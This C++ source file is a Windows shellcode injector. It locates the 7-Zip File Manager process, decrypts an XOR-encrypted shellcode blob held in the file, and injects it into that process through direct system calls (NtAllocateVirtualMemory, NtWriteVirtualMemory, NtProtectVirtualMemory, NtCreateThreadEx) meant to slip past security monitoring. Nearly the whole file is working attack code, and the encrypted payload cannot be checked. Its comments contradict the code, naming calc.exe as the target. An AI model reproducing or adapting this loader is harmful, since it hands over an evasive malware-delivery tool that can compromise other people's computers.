#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include "syscalls_common.h" 

/////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////// COMPILE ME IN VISUAL STUDIO /////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////

HANDLE getHandle() {
    HANDLE hProcess; // Handle to the Process

    // enumerate through all windows processes to get their PIDs 
    HANDLE processsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0); // CreateToolhelp32Snapshot takes a snapshot of the specified processes, as well as the heaps, modules, and threads used by these processes.
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) }; //Set the size of the structure before using it
    DWORD64 dwProcessId;
    // Find the PID of 7zFM.exe and save it for later
    if (Process32First(processsnapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, L"7zFM.exe") != 0) {
            Process32Next(processsnapshot, &processEntry);
        }
    }
    printf("\nPID of 7zip  Manager.exe: %d\n", processEntry.th32ProcessID);
    // Contains the ID of 7zFM.exe
    dwProcessId = processEntry.th32ProcessID;
    // get a handle to the process 
    OBJECT_ATTRIBUTES pObjectAttributes;
    InitializeObjectAttributes(&pObjectAttributes, NULL, NULL, NULL, NULL);
    CLIENT_ID pClientId;
    pClientId.UniqueProcess = (PVOID)dwProcessId;
    pClientId.UniqueThread = (PVOID)0;

    NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &pObjectAttributes, &pClientId); // make a syscall with syswhisprs to get a handle to calc.exe
    return hProcess;
}





int main(int argc, char** argv) {
    /////////////////////////////// Shellcode retrieval ////////////////////////////// 

    printf("\nDecrypting shellcode\n");
    char encryptedShellcode[] = "\xbd\x20\xb4\x89\xc2\x8c\x85\x6e\x6a\x65\x22\x25\x2e\x22\x73\x09\x59\xe5\x3c\x64\x01\x01\xe5\x38\x05\x2b\xff\x3d\x6a\x69\xca\x3a\x17\x25\x3d\xd3\x03\x24\x27\x54\xaa\x3c\xe4\x00\x71\x09\x59\xf7\xc1\x0e\x05\x35\x6c\x46\x45\x22\xb5\xa6\x7f\x60\x40\xa9\xd5\x80\x60\x25\x18\x26\xe1\x37\x43\xff\x2d\x4e\x69\x40\xb8\x51\xec\x4a\x7c\x42\x6c\x65\xe0\x11\x74\x6f\x72\xaa\xc1\xe0\x37\x6d\x32\x2c\xcc\xae\x1e\x02\x2b\x75\xbf\x36\xaa\x01\x48\x7e\x6c\xe2\x34\xc2\x26\x72\x86\x35\x39\x5e\xbb\x69\xbe\xa1\x76\xe6\x06\xec\x01\x6f\xbc\x2d\x52\xb4\x2e\xb3\xe8\x4c\xc4\x76\x6c\xf3\x5c\xa9\x1b\x9b\x29\x60\x38\x4b\x7a\x64\x78\xb9\x42\xb5\x6a\x20\xc2\x2e\x4e\x2c\x62\xa4\x09\x33\xaa\x4d\x20\x73\xe6\x72\x78\x00\x6f\xba\x24\xe8\x70\xe7\x33\x79\x00\x30\x7f\x6c\xe2\x3a\x10\x34\x2b\x3d\x22\x2d\x2e\x28\x69\xc2\x84\x17\x2c\x60\x9b\xa9\x36\x2b\x3c\x39\x3c\xe4\x60\xc8\x0a\x97\xc8\x92\x6f\x2d\xf7\x19\x19\x57\x3c\x47\x5d\x72\x21\x00\x3e\x7e\xe4\xd4\x2c\xc8\x82\xca\x64\x63\x74\x26\xfb\xc4\x08\xd4\x35\x6d\x33\xdf\x43\x6e\x68\x6a\x22\x20\x26\xfb\xc5\x0d\xe1\xc6\x2c\x88\x28\x3e\x48\x6d\x9a\xb6\x38\xe6\x98\x49\x40\x69\x37\x6d\x6b\x25\xf3\x47\xea\x0e\x63\x8b\xba\x18\x2b\x00\x36\x67\x3d\x7f\x55\x80\x23\x5b\xa5\x2b\x8b\xaf\x3a\xa8\x83\x20\xc8\xad\x7a\xed\x88\x2f\xd0\x8f\x6c\xab\x8f\x8d\xf4\x09\xe1\xf0\x07\x22\x25\x11\x22\xe3\x87\x2b\xfd\x96\x33\x9b\xd8\xcd\x43\x0c\xcd\xb1\xcc\xae\x1e\x6f\x2a\x8b\xa1\x07\xc4\xa9\xfb\x37\x6d\x32\x2c\xca\x82\x7a\x2d\xea\x96\x22\x43\xe8\x2b\x6c\x76\x35\x7a\xed\xb0\x2f\xd0\x67\xba\xbc\x30\x8d\xf4\xc2\x90\x37\x13\x67\x2c\xca\xaa\x4a\x3b\xea\x82\x05\x32\x60\x18\x00\x37\x7d\x32\x64\x08\x36\x22\xec\x91\x3c\x5e\xbb\x60\xfb\x30\x93\x3e\xd7\x9b\x9c\x26\xe3\xa6\x2a\xfd\xa8\x3f\x10\x88\x21\xbe\x9d\x7a\xed\x93\x26\xe3\x9c\x22\xce\x6d\xab\xe9\x1e\x97\xe2\xee\xca\x64\x34\x46\x32\x24\x34\x2d\x07\x72\x61\x41\x68\x76\x35\x58\x64\x13\x2f\xd0\x6e\x4c\x7b\x5f\x8d\xf4\x16\x31\x76\xd7\x47\x0a\x04\x0f\x95\xb0\x2a\x8b\xa1\x9b\x1d\xbe\x97\xc8\x25\x33\xa7\x01\x47\xac\x2d\xe6\x82\x1a\xc6\x60\xbe\x8f\x6f\x07\x32\x3d\xf2\x8e\x77\x4f\x69\x35\xe6\xa8\xde\x94";
    char key[] = "Ah7m2dInjector!";
    size_t legitrick_len = sizeof(encryptedShellcode) - 1;
    unsigned char encodedlegitrick[sizeof(encryptedShellcode)]; // éviter char signé

    for (int i = 0; i < legitrick_len; i++) {
        encodedlegitrick[i] = encryptedShellcode[i] ^ key[i % (sizeof(key) - 1)];
    }



    /////////////////////////////// Shellcode Execution ////////////////////////////// 

    // groundwork to inject our shellcode into a process later on
    HANDLE hThread = NULL;              // Handle to the Thread
    HANDLE hProcess = getHandle();      // Retrieve the handle for calc.exe and declare a handle for one of the threads. NtOpenProcess is declared in there
    LPVOID lpAllocationStart = nullptr;
    LPVOID lpStartAddress = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
    if (lpStartAddress == NULL) {
        printf("GetProcAddress failed: %u\n", GetLastError());
    }

    printf("\nInjecting...\n");
    size_t localSize = sizeof(encryptedShellcode) - 1;
    SIZE_T remoteSize = (SIZE_T)localSize; // taille passée à NtAllocateVirtualMemory

    NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, &remoteSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("Memory allocated at %p ", lpAllocationStart);    // Allocate memory in the target process

    NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)encodedlegitrick, (SIZE_T)localSize, nullptr);
    printf("Shellcode written to memory ");

    ULONG old_protect;
    NtProtectVirtualMemory(hProcess, &lpAllocationStart, &remoteSize, PAGE_EXECUTE_READ, &old_protect);
    printf("Memory permissions to execute ");

    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpAllocationStart, lpStartAddress, FALSE, 0, 0, 0, nullptr);
    NtCreateThreadEx(&hThread,GENERIC_EXECUTE,NULL,hProcess,lpAllocationStart,NULL,FALSE,0, 0, 0,nullptr);
    printf("\n Check calc  :D\n");



    NtClose(hProcess);

}
